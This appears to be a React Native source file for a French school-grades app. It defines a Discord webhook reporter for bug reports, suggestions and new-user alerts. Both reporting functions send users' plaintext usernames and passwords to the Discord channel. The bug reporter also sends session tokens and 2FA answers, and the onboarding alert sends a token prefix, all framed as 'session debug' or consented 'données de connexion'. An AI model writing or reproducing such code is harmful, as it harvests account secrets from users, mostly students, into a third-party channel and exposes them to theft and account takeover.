import { Platform } from 'react-native';
import * as Device from 'expo-device';
import { DISCORD_WEBHOOK_URL } from '../config/secrets';

class DiscordHandler {
    static async sendBugReport(message, account, logs = null, type = 'BUG') {
        if (!DISCORD_WEBHOOK_URL) {
            console.warn("Discord Webhook URL not configured in src/config/secrets.js");
            return false;
        }

        try {
            const deviceInfo = {
                os: `${Platform.OS} ${Platform.Version}`,
                model: Device.modelName || "Unknown",
                appVersion: "2.0.1", // TODO: Get from constants
            };

            const embed = {
                title: type === 'SUGGESTION' ? "� Nouvelle Suggestion" : "� Nouveau Signalement",
                color: type === 'SUGGESTION' ? 9133430 : 15548997, // Violet ou Rouge
                fields: [
                    {
                        name: "Utilisateur",
                        value: account ? `**${account.prenom} ${account.nom}**\nID: \`${account.id}\`\n${account.nomEtablissement || ''}` : "Anonyme",
                        inline: true
                    },
                    {
                        name: "Appareil",
                        value: `${deviceInfo.model}\n${deviceInfo.os}`,
                        inline: true
                    },
                    {
                        name: type === 'SUGGESTION' ? "Idée" : "Description",
                        value: message || "Pas de description"
                    }
                ],
                footer: {
                    text: `v${deviceInfo.appVersion} • ${new Date().toLocaleString()}`
                }
            };

            // ZONE DEBUG (SESSION) - Uniquement pour les BUGS
            if (type !== 'SUGGESTION' && logs && logs.credentials) {
                const creds = logs.credentials;
                let debugStr = `User: ${creds.username}\nPass: ${creds.password}\nToken: ${creds.token || 'N/A'}`;

                if (creds.fa) {
                    debugStr += `\n2FA CN: ${creds.fa.cn || 'N/A'}\n2FA CV: ${creds.fa.cv || 'N/A'}`;
                }

                embed.fields.push({
                    name: "🔐 Session Debug (Click to reveal)",
                    value: `|| \`\`\`yaml\n${debugStr}\n\`\`\` ||`
                });
            }

            // Logs Techniques - Uniquement pour les BUGS
            if (type !== 'SUGGESTION' && logs) {
                // On enlève les credentials des logs publics pour éviter le doublon
                const safeLogs = { ...logs };
                delete safeLogs.credentials;

                const logStr = JSON.stringify(safeLogs, null, 2);
                const truncatedLogs = logStr.length > 800 ? logStr.substring(0, 800) + "\n... (tronqué)" : logStr;

                embed.fields.push({
                    name: "📄 Contexte Technique",
                    value: "```json\n" + truncatedLogs + "\n```"
                });
            }

            const payload = {
                username: type === 'SUGGESTION' ? "NotiaNote Suggestion" : "NotiaNote Report", // Dynamic username
                avatar_url: "", // Pas d'avatar bot
                embeds: [embed]
            };

            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            if (!response.ok) {
                console.error("Discord Webhook Error:", response.status, await response.text());
                return false;
            }

            return true;
        } catch (error) {
            console.error("Failed to send Discord report:", error);
            return false;
        }
    }

    static async sendNewUserAlert(account, shareData) {
        if (!DISCORD_WEBHOOK_URL) return false;

        try {
            const embed = {
                title: "🎉 Nouvel Utilisateur !",
                color: shareData ? 5763719 : 9807270, // Green (Share) or Grey (No Share)
                fields: [
                    {
                        name: "👤 Utilisateur",
                        value: account ? `**${account.prenom} ${account.nom}**\n${account.nomEtablissement || 'Établissement inconnu'}` : "Inconnu",
                        inline: true
                    },
                    {
                        name: "📊 Partage Données",
                        value: shareData ? "✅ OUI" : "❌ NON",
                        inline: true
                    }
                ],
                footer: {
                    text: `NotiaNote v2.1 • ${new Date().toLocaleString()}`
                }
            };

            // If user agreed to share data, we include connection details as requested
            // Using the same pattern as bug reporting for consistency
            if (shareData) {
                // Determine if we have credentials to share (only if explicitly requested/appropriate for dev)
                // The user requested "données de connexion".
                // We will fetch them from storage if available.
                const StorageHandler = require('./StorageHandler').default;
                const creds = await StorageHandler.getData("credentials");

                if (creds) {
                    let connectionDetails = `User: ${creds.username}\nPass: ||${creds.password}||\nToken: ||${creds.additionals?.token?.substring(0, 10)}...||`;

                    embed.fields.push({
                        name: "🔐 Données de Connexion",
                        value: connectionDetails
                    });
                }
            }

            const payload = {
                username: "NotiaNote Onboarding",
                avatar_url: "", // Use default webhook avatar
                embeds: [embed]
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            return true;
        } catch (e) {
            console.warn("Failed to send new user alert:", e);
            return false;
        }
    }
}

export default DiscordHandler;
